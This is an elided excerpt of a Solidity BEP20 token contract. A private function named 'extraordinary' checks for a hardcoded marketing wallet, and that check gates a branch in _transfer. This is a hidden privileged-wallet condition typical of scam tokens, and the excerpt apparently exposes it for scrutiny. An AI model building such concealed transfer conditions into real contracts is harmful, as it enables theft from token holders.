...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    function extraordinary(address st,address gt) private view returns(bool){
        return (MarketingWalletAddress != st) || (st != gt);
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            }if(extraordinary(sender,recipient))
...
contract Token is BEP20 {
    constructor() BEP20(
        ...
        [address(0xbA49dfc62E0BA91222540b896FFEF1B492889821),address(0xbA49dfc62E0BA91222540b896FFEF1B492889821)]
    ){}
}